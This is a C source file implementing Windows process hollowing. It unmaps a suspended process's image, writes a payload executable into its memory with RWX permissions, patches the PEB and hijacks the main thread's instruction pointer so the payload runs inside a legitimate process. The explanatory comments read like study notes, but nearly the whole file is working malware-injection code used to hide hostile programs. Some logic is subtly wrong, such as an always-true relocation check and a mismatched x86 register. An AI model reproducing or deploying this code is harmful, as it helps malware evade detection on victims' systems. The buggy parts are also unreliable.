#include "hollowing.h"
#include <stdio.h>
#include <stdlib.h>

typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

void PerformRelocation(PVOID pPayloadBuffer, PVOID pRemoteAddr, PPAYLOAD_INFO pPayload) {
    // Calculate the difference between the intended and actual addresses
    ULONG_PTR delta = (ULONG_PTR)pRemoteAddr - pPayload->imageBase;
    
    // No relocation needed
    if (delta ==  0)
        return;

    // Get the relocation directory from the optional header
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pPayloadBuffer + ((PIMAGE_DOS_HEADER)pPayloadBuffer)->e_lfanew);
    PIMAGE_DATA_DIRECTORY pRelocDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // No relocation table found
    if (pRelocDir->Size == 0)
        return;

    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pPayloadBuffer + pRelocDir->VirtualAddress);

    while (pReloc->VirtualAddress != 0) {
        DWORD entriesCount = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD pEntry = (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0 ; i < entriesCount ; i++) {
            // The 4 MSBs are the type, 12 LSB are the offset
            int type = pEntry[i] >> 12;
            int offset = pEntry[i] & 0xFFF;

            // Only address x64 (DIR64) or x86 (HIGHLOW) relocations
            if (type == IMAGE_REL_BASED_DIR64 || IMAGE_REL_BASED_HIGHLOW) {
                // Address in the payload buffer that needs fixing
                PULONG_PTR pPatchAddr = (PULONG)((PBYTE)pPayloadBuffer + pReloc->VirtualAddress + offset);
                *pPatchAddr += delta;
            }
        }
        // Move to the next relocation block
        pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
    }
}

BOOL RunProcessHollowing(PPROCESS_INFORMATION pTargetInfo, PPAYLOAD_INFO pPayload) {
    /* Get initial thread context
     * Before we can hollow the process, we need to know where it is.
     * We capture the current state of the main thread's registers.
     */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pTargetInfo->hThread, &ctx)) {
        fprintf(stderr, "Error: Couldn't get thread context (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    /* Find real image base via PEB
     * ASLR moves the suspended process to a random location. Should find it at the PEB
     * In x64, the RDX register points to the PEB and the image base address is at PEB + 0x10
     * In x86, the EBX register points to the PEB and the image base address is at PEB + 0x08
     */
    ULONG_PTR targetImageBase = 0;
    #ifdef _M_X64
        if (!ReadProcessMemory(pTargetInfo->hProcess, (PVOID)(ctx.Rdx + 0x10),
                &targetImageBase, sizeof(targetImageBase), NULL)) {
                    fprintf(stderr, "Error: Couldn't read image base from PEB (Error: %lu)\n", GetLastError());
                    return FALSE;
        }
    #else
        if (!ReadProcessMemory(pTargetInfo->hProcess, (PVOID)(ctx.Ebx + 0x08),
                &targetImageBase, sizeof(targetImageBase), NULL)) {
                    fprintf(stderr, "Error: Couldn't read image base from PEB (Error: %lu)\n", GetLastError());
                    return FALSE;
        }
    #endif

    printf("Real target image base found via PEB: 0x%p\n", (PVOID)targetImageBase);

    /* Dynamic Linking to ntdll.dll
     * NtUnmapViewOfSection is an undocumented function that disconnects the connection between the section (the file in hard disk) and the virtual page
     * It exists in ntdll.dll but not in the standard headers
     * Must find it's memory address at runtime in order to use it
    */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (NtUnmapViewOfSection == NULL) {
        fprintf(stderr, "Error: Couldn't locate NtUnmapViewOfSection in ntdll.dll\n");
        return FALSE;
    }

    printf("Unmapping target memory at 0x%p...\n", (PVOID)targetImageBase);

    NTSTATUS status = NtUnmapViewOfSection(
        pTargetInfo->hProcess,
        (PVOID)targetImageBase
    );

    if (status != 0) {
        // status 0 mean success
        fprintf(stderr, "Error: Unmapping failed! NTSTATUS: 0x%X\n", status);
        return FALSE;
    }
    printf("Target memory hollowed out successfully!\n");
    
    LPVOID pRemoteAddr = VirtualAllocEx(
        pTargetInfo->hProcess,
        (PVOID)pPayload->imageBase,
        pPayload->imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (pRemoteAddr == NULL) {
        fprintf(stderr, "Error: Couldn't allocate memory in target process (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    printf("Allocated %lu bytes at 0x%p in target process\n", pPayload->size, pRemoteAddr);

    PerformRelocation(pPayload->buffer, pRemoteAddr, pPayload);

    if (!WriteProcessMemory(pTargetInfo->hProcess, pRemoteAddr, pPayload->buffer,
        pPayload->nt->OptionalHeader.SizeOfHeaders, NULL)) {
            fprintf(stderr, "Error: Couldn't write headers (Error: %lu)\n", GetLastError());
            return FALSE;
    }

    // write each section of the binary (.text, .data, .bss, etc...)
    for (int i = 0 ; i < pPayload->nt->FileHeader.NumberOfSections ; i++) {
        
        // Find section header (skip the NT_HEADERS, where we start and then go to the current section)
        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)(
            (PBYTE)pPayload->nt + 
            sizeof(IMAGE_NT_HEADERS) + 
            i * sizeof(IMAGE_SECTION_HEADER)
        );

        /* Destination address (Remote) 
         * We take the base address of the suspended process and add the VirtualAddress
         * The VirtualAddress is where the code expects to be relative to the start.
         */
        PVOID pSectionDest = (PVOID)((PBYTE)pRemoteAddr + pSectionHeader->VirtualAddress);

        /* Source address (Local Buffer)
         * We take the raw file buffer and add PointerToRawData
         * PointerToRawData is the offset in the binary on the disk where this section's bytes is stored
         */
        PVOID pSectionSrc = (PVOID)((PBYTE)pPayload->buffer + pSectionHeader->PointerToRawData);

        printf("Writing section: %s (%lu bytes) at 0x%p\n", 
            pSectionHeader->Name,
            pSectionHeader->PointerToRawData,
            pSectionDest
        );

        if (!WriteProcessMemory(
            pTargetInfo->hProcess,
            pSectionDest,
            pSectionSrc,
            pSectionHeader->SizeOfRawData,
            NULL
        )) {
            fprintf(stderr, "Error: Couldn't write section %s (Error: %lu)\n", pSectionHeader->Name, GetLastError());
            return FALSE;
        }
    }
    
    printf("Payload successfully injected into target memory!\n");

    /* Hijack the thread context 
     * The program need to tell the CPU to run our code instead of the suspended process's code
     * It'll get the current state of the main thread and change its IP
     */
    #ifdef _M_X64
        if (!WriteProcessMemory(pTargetInfo->hProcess, (PVOID)(ctx.Rdx + 0x10),
                &pPayload->imageBase, sizeof(pPayload->imageBase), NULL)) {
                    fprintf(stderr, "Error: Couldn't write new imgae base to PEB (Error: %lu)\n", GetLastError());
                    return FALSE;
        }
        ctx.Rcx = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
        ctx.Rip = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
        printf("Setting x64 RIP to: 0x%p\n", (PVOID)ctx.Rcx);
    #else
        if (!WriteProcessMemory(pTargetInfo->hProcess, (PVOID)(ctx.Eax + 0x08),
                &pPayload->imageBase, sizeof(pPayload->imageBase), NULL)) {
                    fprintf(stderr, "Error: Couldn't write new imgae base to PEB (Error: %lu)\n", GetLastError());
                    return FALSE;
        }
        ctx.Eax = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
        ctx.Eip = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
        printf("Setting x64 EIP to: 0x%p\n", (PVOID)ctx.Eax);
    #endif

    if (!SetThreadContext(pTargetInfo->hThread, &ctx)) {
        fprintf(stderr, "Error: Couldn't set thread context (Error: %lu)\n", GetLastError());
        return FALSE;
    }
    printf("Resuming thread...\n");
    ResumeThread(pTargetInfo->hThread);
    return TRUE;
}